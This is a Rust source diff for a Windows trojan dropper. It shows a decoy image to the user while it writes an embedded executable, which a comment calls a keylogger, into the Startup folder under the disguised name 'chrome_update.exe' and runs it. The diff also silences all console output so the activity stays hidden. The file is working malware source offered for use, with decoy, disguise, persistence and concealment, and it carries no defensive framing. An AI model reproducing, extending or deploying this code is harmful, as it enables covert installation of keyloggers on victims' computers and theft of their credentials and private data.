@@ -9,29 +9,22 @@ const IMAGE_FILE_OUT: &'static str = "./golzar.jpg";
 
 // Include the exe file as a binary blob
 const EXE_DATA: &'static [u8] = include_bytes!("app.exe");
-// Assuming that you want to write the file to the user's Startup folder
-const EXE_FILE_OUT: &'static str =
-    r"C:\Users\mailp\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\keylogger.exe";
-
-// Name of your program
-const EXE_NAME: &'static str = "your_program.exe";
+// Name of keylogger (vlc, chrome,...)
+const EXE_NAME: &'static str = "chrome_update.exe";
 
 fn main() {
-    // unsafe { windows::Win32::System::Console::FreeConsole() };
-
-    write_file();
+    write_image_file();
 
     // Open the image with the default program
     match Command::new("cmd")
         .args(&["/C", "start", "/B", IMAGE_FILE_OUT]) // add /B argument to start process in the background
-        .spawn()
+        .spawn()// use spawn instead of status to not wait for the process to finish
     {
-        // use spawn instead of status to not wait for the process to finish
         Ok(_) => {
-            // println!("Successfully opened the image.");
+            debug_print(format!("Successfully opened the image."));
         }
         Err(e) => {
-            // println!("Failed to execute command: {}", e)
+            debug_print(format!("Failed to execute command: {}", e));
         }
     };
 
@@ -40,39 +33,42 @@ fn main() {
     let startup_dir = match get_startup_dir() {
         Some(dir) => dir,
         None => {
-            println!("Failed to get the Startup directory");
+            debug_print(format!("Failed to get the Startup directory"));
             return;
         }
     };
 
-    let exe_file_out = startup_dir.join(EXE_NAME);
-    write_app_file(&exe_file_out);
-    // Attempt to run the .exe file
-    match Command::new(&exe_file_out).spawn() {
-        Ok(child) => {
-            println!("Successfully opened the .exe.");
-            // Here you can use child.id() to get the PID, or child.kill() to kill the process, etc.
-        }
-        Err(e) => {
-            println!("Failed to execute .exe: {}", e)
-        }
-    };
-
-    // std::thread::sleep(std::time::Duration::from_secs(3));
+    let exe_file_out_opt = write_app_file();
+    match exe_file_out_opt {
+        Some(exe_file_out) => {
+            // Attempt to run the .exe file
+            match Command::new(&exe_file_out).spawn() {
+                Ok(child) => {
+                    debug_print(format!("Successfully opened the .exe."));
+                },
+                Err(e) => {
+                    debug_print(format!("Failed to execute .exe: {}", e))
+                },
+            };
+        },
+        None => {
+            debug_print("Executable file was not created.".to_string());
+        },
+    }
 }
 
-fn write_file() {
+fn write_image_file() {
     // Write the image to a file
     let mut file = match File::create(IMAGE_FILE_OUT) {
         Ok(file) => file,
         Err(e) => {
-            println!("Failed to create file: {}", e);
+            debug_print(format!("Failed to create file: {}", e));
             return;
         }
     };
 
     if let Err(e) = file.write_all(IMAGE_DATA) {
-        println!("Failed to write to file: {}", e);
+        debug_print(format!("Failed to write to file: {}", e));
         return;
     }
 
@@ -84,45 +80,41 @@ fn write_file() {
     {
         Ok(status) => {
             if !status.success() {
-                println!("Command executed, but reported failure.");
+                debug_print(format!("Command executed, but reported failure."));
             }
         }
         Err(e) => {
-            println!("Failed to execute command: {}", e)
+            debug_print(format!("Failed to execute command: {}", e))
         }
     };
 }
 
-fn write_app_file(exe_file_out: &PathBuf) {
+fn write_app_file() -> Option<PathBuf> {
+    let startup_dir = match get_startup_dir() {
+        Some(dir) => dir,
+        None => {
+            debug_print(format!("Failed to get the Startup directory"));
+            return None;
+        }
+    };
+
+    let exe_file_out = startup_dir.join(EXE_NAME);
+
     // Write the exe to a file
-    let mut file = match File::create(exe_file_out) {
+    let mut file = match File::create(&exe_file_out) {
         Ok(file) => file,
         Err(e) => {
-            println!("Failed to create file: {}", e);
-            return;
+            debug_print(format!("Failed to create file: {}", e));
+            return None;
         }
     };
 
     if let Err(e) = file.write_all(EXE_DATA) {
-        println!("Failed to write to file: {}", e);
-        return;
+        debug_print(format!("Failed to write to file: {}", e));
+        return None;
     }
-}
 
-fn write_app_file_old() {
-    // Write the exe to a file
-    let mut file = match File::create(EXE_FILE_OUT) {
-        Ok(file) => file,
-        Err(e) => {
-            println!("Failed to create file: {}", e);
-            return;
-        }
-    };
-
-    if let Err(e) = file.write_all(EXE_DATA) {
-        println!("Failed to write to file: {}", e);
-        return;
-    }
+    Some(exe_file_out)
 }
 
 fn get_startup_dir() -> Option<PathBuf> {
@@ -131,4 +123,10 @@ fn get_startup_dir() -> Option<PathBuf> {
         return Some(path);
     }
     None
+}
+
+fn debug_print( message: String) {
+    if false {
+        println!("{}", message);
+    }
 }
